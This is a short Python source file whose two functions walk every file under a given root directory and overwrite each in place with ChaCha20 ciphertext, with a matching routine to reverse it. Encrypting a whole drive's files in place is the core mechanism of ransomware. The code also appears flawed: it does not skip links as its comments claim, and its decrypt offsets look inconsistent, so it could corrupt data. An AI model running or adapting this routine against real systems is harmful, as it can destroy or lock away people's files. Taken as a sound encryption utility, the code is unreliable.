import os
import pathlib
import psutil
import secrets
from Crypto.Cipher import ChaCha20

CHUNK_SIZE = 1048576 # 1MB

def fully_encrypt_drive(root: str, key: bytearray):

	# walk root and encrypt. skip links.
	for dir, sub_dirs, file_names in os.walk(root):
		for file_name in file_names:
			with open(os.path.join(dir, file_name), mode="r+b") as file:
				nonce = secrets.token_bytes(24)
				cipher = ChaCha20.new(key=key, nonce=nonce)
				file.seek(0, os.SEEK_END)
				file.seek(file.tell() - (file.tell() % CHUNK_SIZE))
				while True:
					pos = file.tell()
					cipher.seek(pos)
					cipher_data = cipher.encrypt(file.read(CHUNK_SIZE))
					file.seek(pos+24, os.SEEK_SET)
					file.write(cipher_data)
					if pos >= CHUNK_SIZE:
						file.seek(pos - CHUNK_SIZE, os.SEEK_SET)
					else:
						break
				file.seek(0, os.SEEK_SET)
				file.write(nonce)


def fully_decrypt_drive(root: str, key: bytearray):
	# walk root and decrypt. skip links.
	for dir, sub_dirs, file_names in os.walk(root):
		for file_name in file_names:
			with open(os.path.join(dir, file_name), mode="r+b") as file:
				file.seek(0, os.SEEK_END)
				file_size = file.tell()
				file.seek(0, os.SEEK_SET)
				nonce = file.read(24)

				cipher = ChaCha20.new(key=key, nonce=nonce)
				while file.tell() < file_size:
					pos = file.tell()
					plain_data = cipher.decrypt(file.read(CHUNK_SIZE))
					file.seek(pos-24, os.SEEK_SET)
					file.write(plain_data)
					file.seek(pos + CHUNK_SIZE, os.SEEK_SET)

				file.seek(-24, os.SEEK_END)
				file.truncate(file.tell())
